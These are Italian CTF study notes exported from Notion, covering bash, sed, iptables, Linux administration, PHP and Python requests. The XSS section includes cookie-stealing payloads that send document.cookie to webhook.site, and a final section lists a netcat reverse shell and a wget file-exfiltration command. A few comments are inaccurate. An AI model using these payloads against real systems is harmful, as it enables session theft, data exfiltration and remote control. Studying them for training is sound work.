<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Esercizi cysec</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
	margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(50, 48, 44, 1);
}
.highlight-gray {
	color: rgba(115, 114, 110, 1);
	fill: rgba(115, 114, 110, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(205, 60, 58, 1);
	fill: rgba(205, 60, 58, 1);
}
.highlight-default_background {
	color: rgba(50, 48, 44, 1);
}
.highlight-gray_background {
	background: rgba(248, 248, 247, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(248, 243, 252, 1);
}
.highlight-pink_background {
	background: rgba(252, 241, 246, 1);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(115, 114, 110, 1);
	fill: rgba(115, 114, 110, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(205, 60, 58, 1);
	fill: rgba(205, 60, 58, 1);
}
.block-color-default_background {
	color: inherit;
	fill: inherit;
}
.block-color-gray_background {
	background: rgba(248, 248, 247, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(248, 243, 252, 1);
}
.block-color-pink_background {
	background: rgba(252, 241, 246, 1);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-default { background-color: rgba(84, 72, 49, 0.08); }
.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="22e95fc6-a77c-801f-8cfa-fdea2375b4e6" class="page sans"><header><h1 class="page-title">Esercizi cysec</h1><p class="page-description"></p></header><div class="page-body"><p id="22e95fc6-a77c-80c6-9659-c958c457393d" class=""><strong>All’inizio del codice bash:</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-80e2-8e79-f9816e298fdb" class="code"><code class="language-Bash">#! /usr/bin/env bash
(oppure)
#! /bin/bash</code></pre><p id="22e95fc6-a77c-8055-8ff3-d0b7ebafdf6d" class="">
</p><p id="22e95fc6-a77c-80b6-b4c3-d9cbb5874962" class=""><strong>Ripassino di SED</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-80c9-b555-ef3fe5e45aac" class="code"><code class="language-Bash">sed &#x27;/pattern/ d&#x27; file #cancella il file
sed &#x27;/pattern/ c\nuova_riga&#x27; file #modifica il file con quello che segue c

#altri pattern utili:
#sostituire l&#x27;occorrenza in una riga
s/vecchio/nuovo
#sostituire tutte le occorrenze di una riga
s/vecchio/nuovo/g
#sostituire vecchio con nuovo solo alla quarta occorrenza della riga
sed &#x27;4s/pattern/sostituto/g&#x27; file
#sostituire vecchio con nuovo solo alla quarta occorrenza di vecchio in ogni riga
sed &#x27;s/pattern/sostituto/4&#x27; file</code></pre><p id="22e95fc6-a77c-8015-9d4a-f7804584fb2e" class="">
</p><p id="22e95fc6-a77c-8004-b25f-c966963a6e12" class=""><strong>Ripassino Permessi</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-80d8-9822-c1ab24c772f9" class="code"><code class="language-Bash">SUID = 100 = 4
GUID = 010 = 2
Sticky = 001 = 1

r = 100 = 4
w = 010 = 2
x = 001 = 1
#e combinati sempre in binario! -&gt; SUID + rw + niente + niente = 4600</code></pre><p id="22e95fc6-a77c-8047-892b-e046eddae0e8" class="">
</p><p id="22e95fc6-a77c-8047-8fe3-ef958bc9914a" class=""><strong>Ripasso iptables</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-80f6-954d-f401f2947d61" class="code"><code class="language-Bash">sudo iptables 
-A/F/P INPUT/OUTPUT/FORWARD #(A)inserisce nuova regola, (F)Flusha tutto o (P)Policy predefinita
-i &lt;interfaccia input(es.lo, eth0,wlan0,docker,enp0s3)&gt; 
-o &lt;interfaccia output&gt;
-p &lt;protocollo(es.tcp,udp,icmp,esp)&gt; 
-m multiport #per specificare più porte
-dport &lt;numero_porta_destinazione (per output)&gt;
-sport &lt;numero_porta_source (per input)&gt; 
-s &lt;ip_source&gt;
-d &lt;ip_destination&gt;
-m state --state NEW,ESTABLISHED,INVALID #stati del pacchetto
-j ACCEPT/DROP/REJECT/LOG #azioni all&#x27;arrivo di un pacchetto valido (jump)
#nota -j serve sempre tranne che per la policy predefinita!</code></pre><p id="22e95fc6-a77c-8020-b675-fea554faf14a" class="">Altro su iptables</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-80fb-9fe2-e5e24d281b5a" class="code"><code class="language-Bash">iptables -L #mostra configurazione attuale

iptables-save #per mostrare in output la corrente
iptables-save &gt; file.txt #per salvare

iptables-restore &lt; file.txt #per restorare</code></pre><p id="22f95fc6-a77c-803d-a7d6-fa05c8ac453d" class="">
</p><p id="22e95fc6-a77c-80c9-8327-e9e2e66961b6" class=""><strong>Linux system</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-80d3-9ee5-de04a8dad855" class="code"><code class="language-Bash">ps -aux #controlla i processi
netstat -tulnp #controllo porte apert


systemctl #controllo systemd - overview del OS
systemctl list-unit-files --state=enabled #controlla i servizi enabled
systemctl start/enable/stop servizio #avvia, avvia al boot o spegne un servizio

journalctl -u &lt;unit&gt; #prende i log da unit

#cosa succede se il processo crasha, 
#quale utente lo esegue, variabili d&#x27;ambiente -&gt; systemctl
#cambi file unit in /etc/systemd/system

#user definito in /etc/shadow (adduser per crearne nuovi)
#gruppi in /etc/group
#password in /etc/shadow (criptate e accessibili solo a root)

#PAM - configurazione pam.d per cambiare requisiti password
#Logs - /var/log </code></pre><p id="22e95fc6-a77c-8099-8b1b-d9592fabf4aa" class="">
</p><p id="22e95fc6-a77c-80b7-be00-ed0c946d3537" class=""><strong>Ripasso JavaScript [utile in XSS]</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-8075-b8f1-da741c9e8370" class="code"><code class="language-Bash">alert(&#x27;XSS&#x27;)  #test alert per vedere se funziona js
document.location.href #url posizione
document.cookie #ruba cookie

fetch(&quot;https://webhook.site/?&quot; + document.cookie) #esfiltra dati verso sito attaccante

#in generale in html si mette tra &lt;script&gt;&lt;/script&gt; però spesso è blacklistato:
#in questo caso richiamo con attributi evento:
&lt;img src=&quot;x&quot; onerror=&quot;fetch(&#x27;webhook_link&#x27; + document.cookie)&quot;&gt;</code></pre><p id="22f95fc6-a77c-8093-a50d-f146b8ec56bf" class="">
</p><p id="22f95fc6-a77c-80d5-8206-fbf10908a7cf" class=""><strong>Ripassino PHP</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22f95fc6-a77c-8020-b046-c59e9259fd23" class="code"><code class="language-Bash">&lt;?php ... ?&gt;

#funzioni utili:
#echo: stampa a schermo
echo &quot;Ciao &quot; . $_GET[&#x27;name&#x27;]; 
print(&quot;&quot;)

#funzioni di sistema
exec()
system()
eval()

#metodi superglobali
$_GET[&#x27;x&#x27;]	#Dato via URL (?x=...)
$_POST[&#x27;x&#x27;]	#Dato via form (metodo POST)

#altro
var_dump è una funzione che printa tutto il contenuto di una variabile

$y = array(”x” =&gt; “Hello”); #array associativi
print($y[x]); #ci si accede così</code></pre><p id="22f95fc6-a77c-804e-bab1-e69ac11ec687" class="">
</p><p id="22f95fc6-a77c-8092-b2f2-e3425e5985c1" class=""><strong>Ripasso Python Requests</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22f95fc6-a77c-808c-a117-c4d09d82c475" class="code"><code class="language-Bash">import requests

url = &#x27;http://xss1.challs.cyberchallenge.it/report&#x27;
r = requests.get(url)
print(&quot;ricevuto: &quot;, r.status_code)
print(&quot;cookies: &quot;, r.cookies)

#Uso un cookie mio in una get
cookies = {&#x27;my_cookie&#x27;: &#x27;cookie_value&#x27;}
r = requests.get(url, cookies=cookies)
print(&quot;ricevuto: &quot;, r.status_code)

## POST
p=requests.post(&#x27;url&#x27;, data={&#x27;key&#x27;: &#x27;value&#x27;})
print(&quot;ricevuto: &quot;, p.json())


# METODI DELETE, HEAD, OPTIONS
r = requests.delete(&#x27;https://httpbin.org/delete&#x27;)
r = requests.head(&#x27;https://httpbin.org/get&#x27;)
r = requests.options(&#x27;https://httpbin.org/get&#x27;)</code></pre><p id="22f95fc6-a77c-80dc-8c25-da44fcd9d0cb" class="">
</p><p id="22f95fc6-a77c-8009-92cf-cb3b0aa7633e" class=""><strong>Esfiltrare dati</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22f95fc6-a77c-803d-8493-c977f8dcd4a7" class="code"><code class="language-Bash">nc -e /bin/bash host port #reverse shell (mi ci connetto con nc)
wget  --post-file &lt;file&gt; http://webhook... #con command injection
